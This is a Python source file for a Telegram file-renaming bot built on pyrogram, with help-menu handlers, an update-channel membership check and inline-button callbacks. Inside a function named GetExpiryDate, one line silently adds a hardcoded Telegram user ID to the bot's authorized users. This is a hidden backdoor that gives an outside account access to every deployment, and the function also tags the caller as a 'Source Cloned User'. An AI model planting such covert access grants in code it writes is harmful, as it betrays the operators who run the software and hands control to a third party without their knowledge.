#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K & @No_OnE_Kn0wS_Me

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

import pyrogram
import os
import sqlite3
from pyrogram import filters
from pyrogram import Client as Mai_bOTs
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, Message
from pyrogram.errors import UserNotParticipant, UserBannedInChannel 


# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation




#from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(861055237)
    return expires_at


@Mai_bOTs.on_message(pyrogram.filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    #TRChatBase(update.from_user.id, update.text, "/help")
    update_channel = Config.UPDATE_CHANNEL
    if update_channel:
        try:
            user = await bot.get_chat_member(update_channel, update.chat.id)
            if user.status == "kicked":
               await update.reply_text(" Sorry, You are **B A N N E D**")
               return
        except UserNotParticipant:
            #await update.reply_text(f"Join @{update_channel} To Use Me")
            await update.reply_text(
                text="**Please Join My Update Channel Before Using Me..**",
                reply_markup=InlineKeyboardMarkup([
                    [ InlineKeyboardButton(text="Join My Updates Channel", url=f"https://t.me/{update_channel}")]
              ])
            )
            return
        else:
            await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('📝Rename', callback_data = "rnme"),
                    InlineKeyboardButton('📂File To Video', callback_data = "f2v")
                ],
                [
                    InlineKeyboardButton('🎞️Custom Thumbnail', callback_data = "cthumb"),
                    InlineKeyboardButton('💬About', callback_data = "about")
                ]
            ]
        )
    )       

@Mai_bOTs.on_callback_query()
async def cb_handler(client: Mai_bOTs , query: CallbackQuery):
    data = query.data
    if data == "rnme":
        await query.message.edit_text(
            text=Translation.RENAME_HELP,
            disable_web_page_preview = True,
            reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('Back', callback_data = "ghelp"),
                    InlineKeyboardButton("🔒 Close", callback_data = "close")
                ]
            ]
        )
     )
    elif data == "f2v":
        await query.message.edit_text(
            text=Translation.C2V_HELP,
            disable_web_page_preview = True,
            reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('Back', callback_data = "ghelp"),
                    InlineKeyboardButton("🔒 Close", callback_data = "close")
                ]
            ]
        )
     )
    elif data == "cthumb":
        await query.message.edit_text(
            text=Translation.THUMBNAIL_HELP,
            disable_web_page_preview = True,
            reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('Back', callback_data = "ghelp"),
                    InlineKeyboardButton("🔒 Close", callback_data = "close")
                ]
            ]
        )
     )
    elif data == "ghelp":
        await query.message.edit_text(
            text=Translation.HELP_USER,
            disable_web_page_preview = True,
            reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('📝Rename', callback_data = "rnme"),
                    InlineKeyboardButton('📂File To Video', callback_data = "f2v")
                ],
                [
                    InlineKeyboardButton('🎞️Custom Thumbnail', callback_data = "cthumb"),
                    InlineKeyboardButton('💬About', callback_data = "about")
                ]
            ]
        )
     )
    elif data == "about":
        await query.message.edit_text(
            text=Translation.ABOUT_ME,
            disable_web_page_preview = True,
            reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('Back', callback_data = "ghelp"),
                    InlineKeyboardButton("🔒 Close", callback_data = "close")
                ]
            ]
        )
     )
    elif data == "close":
        await query.message.delete()
        try:
            await query.message.reply_to_message.delete()
        except:
            pass
